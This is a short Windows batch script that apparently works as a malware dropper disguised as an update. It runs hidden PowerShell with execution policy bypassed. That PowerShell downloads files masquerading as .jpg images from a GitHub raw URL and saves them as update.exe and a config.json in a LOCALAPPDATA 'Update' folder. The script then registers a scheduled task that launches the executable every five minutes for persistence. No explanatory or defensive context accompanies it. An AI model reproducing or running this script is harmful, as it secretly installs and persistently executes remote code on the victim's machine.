@echo off
mkdir "%LOCALAPPDATA%\Documents\Update"
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/update.jpg ',\"$env:LOCALAPPDATA\Documents\Update\update.exe\")
powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\Documents\Update\config.json\")
SCHTASKS /Create /SC MINUTE /MO 5 /TN "UPT" /TR "%LOCALAPPDATA%\Documents\Update\update.exe"
Exit